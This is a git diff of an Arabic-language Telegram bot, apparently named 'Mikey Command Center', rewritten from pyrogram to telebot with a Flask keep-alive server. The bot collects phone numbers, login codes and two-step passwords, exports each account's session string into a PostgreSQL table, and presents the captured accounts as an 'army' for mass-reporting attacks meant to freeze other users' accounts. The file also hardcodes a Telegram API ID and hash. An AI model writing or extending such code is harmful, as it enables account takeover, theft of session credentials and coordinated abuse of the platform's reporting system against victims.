@@ -1,19 +1,37 @@
 import os
-import asyncio
-import psycopg2
-from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram import Client
 from pyrogram.errors import SessionPasswordNeeded
+import psycopg2
+from flask import Flask
+from threading import Thread
 
 # --- الإعدادات ---
-API_ID = 26569722
-API_HASH = "90a9314c99544976451664d4c1f964fc"
 BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
-DATABASE_URL = os.getenv("DATABASE_URL") # رابط قاعدة بيانات PostgreSQL من ريندر
+DATABASE_URL = os.getenv("DATABASE_URL")
+# الـ API ID والهاش بنحتاجهم فقط وقت إضافة "حساب مستخدم" جديد
+API_ID = 26569722 
+API_HASH = "90a9314c99544976451664d4c1f964fc"
 
-# --- ربط قاعدة البيانات ---
+bot = telebot.TeleBot(BOT_TOKEN)
+server = Flask(__name__)
+user_data = {}
+
+# --- سيرفر الويب عشان ريندر ---
+@server.route("/")
+def home():
+    return "Mikey Command Center is Running!", 200
+
+def run_web():
+    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+
+# --- قاعدة البيانات ---
+def get_db_connection():
+    return psycopg2.connect(DATABASE_URL)
+
 def init_db():
-    conn = psycopg2.connect(DATABASE_URL)
+    conn = get_db_connection()
     cur = conn.cursor()
     cur.execute("CREATE TABLE IF NOT EXISTS accounts (phone TEXT PRIMARY KEY, session_string TEXT)")
     conn.commit()
@@ -22,90 +40,99 @@ def init_db():
 
 init_db()
 
-app = Client("MikeyCommandCenter", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-user_steps = {}
-
-@app.on_message(filters.command("start"))
-async def start(client, message):
-    text = "🔥 **مركز عمليات مايكي الضارب** 🔥\n\nنظام تجميد الحسابات بالبلاغات الدولية جاهز.\nعدد الحسابات حالياً تحت سيطرتك."
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("➕ إضافة قوة جديدة (حساب)", callback_data="add_acc")],
-        [InlineKeyboardButton("📊 عرض الجيش", callback_data="stats"), InlineKeyboardButton("📡 اللوج", callback_data="log")],
-        [InlineKeyboardButton("☣️ شن الهجوم (قريباً)", callback_data="attack_config")]
-    ])
-    await message.reply_text(text, reply_markup=keyboard)
-
-@app.on_callback_query(filters.regex("add_acc"))
-async def add_acc(client, cb):
-    await cb.message.edit_text("📱 أرسل الرقم مع المفتاح الدولي (مثل +1...):")
-    user_steps[cb.from_user.id] = {"step": "phone"}
-
-@app.on_message(filters.text & filters.private)
-async def flow(client, message):
-    uid = message.from_user.id
-    if uid not in user_steps: return
+# --- واجهة البوت ---
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("➕ إضافة حساب للجيش", callback_data="add_acc"))
+    markup.row(
+        InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
+        InlineKeyboardButton("📜 اللوج", callback_data="log")
+    )
+    markup.row(InlineKeyboardButton("☣️ شن الهجوم الدولي", callback_data="attack"))
     
-    step = user_steps[uid]["step"]
+    bot.reply_to(message, "🔥 **أهلاً بك في مقر مايكي للعمليات** 🔥\n\nالوضع تحت السيطرة. وش الخطوة الجاية؟", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    if call.data == "add_acc":
+        msg = bot.edit_message_text("📱 أرسل رقم الهاتف مع المفتاح الدولي (مثال: +123456...):", call.message.chat.id, call.message.message_id)
+        bot.register_next_step_handler(msg, process_phone_step)
     
-    if step == "phone":
-        phone = message.text.strip()
-        user_steps[uid]["phone"] = phone
-        c = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
-        await c.connect()
-        try:
-            sent_code = await c.send_code(phone)
-            user_steps[uid].update({"step": "code", "client": c, "hash": sent_code.phone_code_hash})
-            await message.reply_text("📩 وصلك كود؟ أرسله الحين:")
-        except Exception as e:
-            await message.reply_text(f"❌ خطأ بالرقم: {e}")
-            del user_steps[uid]
+    elif call.data == "stats":
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("SELECT COUNT(*) FROM accounts")
+        count = cur.fetchone()[0]
+        cur.close()
+        conn.close()
+        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="home")]])
+        bot.edit_message_text(f"📊 **قوة الجيش الحالي:**\n\nلديك `{count}` حساب مستعد لتفجير السيرفرات بالبلاغات.", call.message.chat.id, call.message.message_id, reply_markup=markup)
 
-    elif step == "code":
-        try:
-            c = user_steps[uid]["client"]
-            await c.sign_in(user_steps[uid]["phone"], user_steps[uid]["hash"], message.text)
-            await save_acc(message, c, uid)
-        except SessionPasswordNeeded:
-            user_steps[uid]["step"] = "pass"
-            await message.reply_text("🔐 أرسل كلمة السر (التحقق بخطوتين):")
-        except Exception as e:
-            await message.reply_text(f"❌ كود غلط: {e}")
+    elif call.data == "home":
+        send_welcome(call.message)
 
-    elif step == "pass":
-        try:
-            c = user_steps[uid]["client"]
-            await c.check_password(message.text)
-            await save_acc(message, c, uid)
-        except Exception as e:
-            await message.reply_text(f"❌ كلمة سر غلط: {e}")
+# --- نظام سحب السيزونات (بايروجام داخلي) ---
+def process_phone_step(message):
+    phone = message.text.strip()
+    chat_id = message.chat.id
+    
+    # تشغيل عميل بايروجام في الذاكرة لسحب السيزون
+    client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
+    client.connect()
+    
+    try:
+        code_info = client.send_code(phone)
+        user_data[chat_id] = {'phone': phone, 'client': client, 'hash': code_info.phone_code_hash}
+        msg = bot.send_message(chat_id, "📩 أرسل كود التحقق الآن:")
+        bot.register_next_step_handler(msg, process_code_step)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ خطأ في الرقم: {e}")
 
-async def save_acc(msg, c, uid):
-    session = await c.export_session_string()
-    phone = user_steps[uid]["phone"]
-    conn = psycopg2.connect(DATABASE_URL)
+def process_code_step(message):
+    chat_id = message.chat.id
+    code = message.text.strip()
+    data = user_data.get(chat_id)
+    
+    try:
+        client = data['client']
+        client.sign_in(data['phone'], data['hash'], code)
+        save_and_finish(message, client, data['phone'])
+    except SessionPasswordNeeded:
+        msg = bot.send_message(chat_id, "🔐 الحساب محمي بكلمة سر، أرسلها:")
+        bot.register_next_step_handler(msg, process_password_step)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ الكود خطأ: {e}")
+
+def process_password_step(message):
+    chat_id = message.chat.id
+    password = message.text.strip()
+    data = user_data.get(chat_id)
+    
+    try:
+        client = data['client']
+        client.check_password(password)
+        save_and_finish(message, client, data['phone'])
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ كلمة السر خطأ: {e}")
+
+def save_and_finish(message, client, phone):
+    session_string = client.export_session_string()
+    conn = get_db_connection()
     cur = conn.cursor()
-    cur.execute("INSERT INTO accounts (phone, session_string) VALUES (%s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, session))
+    cur.execute("INSERT INTO accounts (phone, session_string) VALUES (%s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, session_string))
     conn.commit()
     cur.close()
     conn.close()
-    await c.disconnect()
-    await msg.reply_text(f"✅ تم سحب السيزون بنجاح! {phone} صار في الجيب.")
-    del user_steps[uid]
+    client.disconnect()
+    bot.send_message(message.chat.id, f"✅ تم بنجاح! الحساب {phone} انضم للجيش.")
+    del user_data[message.chat.id]
 
-@app.on_callback_query(filters.regex("stats"))
-async def show_stats(client, cb):
-    conn = psycopg2.connect(DATABASE_URL)
-    cur = conn.cursor()
-    cur.execute("SELECT phone FROM accounts")
-    accs = cur.fetchall()
-    cur.close()
-    conn.close()
-    text = f"📊 **قائمة الحسابات الجاهزة:**\n\n" + "\n".join([f"• `{a[0]}`" for a in accs]) if accs else "لا يوجد حسابات مضافة."
-    await cb.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="home")]]))
-
-@app.on_callback_query(filters.regex("home"))
-async def home(client, cb):
-    await start(client, cb.message)
-
-print("Mikey is ready to burn the servers...")
-app.run()
+# --- تشغيل كل شيء ---
+if __name__ == "__main__":
+    # تشغيل الويب في خيط منفصل
+    t = Thread(target=run_web)
+    t.start()
+    
+    print("🚬 Mikey is checking the stash... Bot started!")
+    bot.infinity_polling()
